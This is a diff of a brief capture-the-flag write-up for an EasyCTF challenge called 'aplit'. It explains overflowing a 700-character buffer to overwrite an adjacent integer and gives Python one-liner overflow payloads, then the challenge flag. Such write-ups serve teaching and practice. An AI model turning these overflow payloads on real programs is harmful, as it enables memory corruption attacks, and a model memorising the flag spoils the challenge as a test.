@@ -1,12 +1,6 @@
 There's a 700-character buffer and an int right above that.
 If we overflow from the buffer, we can write to the int.
-However, doing so caused a segfault before the flag read.
-Playing around for a minute, I noticed that \x08 didn't cause
-a segfault, but did overwrite the int. No clue why, but it works.
-$ ./aplit $(python -c "print 'A'*708 + '\x08\x08\x08\x08\x08'")
-
-It appears the problem was immediately changed, so the \x08 is no longer
-required.
-$ ./aplit $(python -c "print 'A'*709")
+We need to set the int to a number greater than 12.
+$ ./aplit $(python -c "print 'A'*800")
 
 easyctf{essays_are_too_hard}
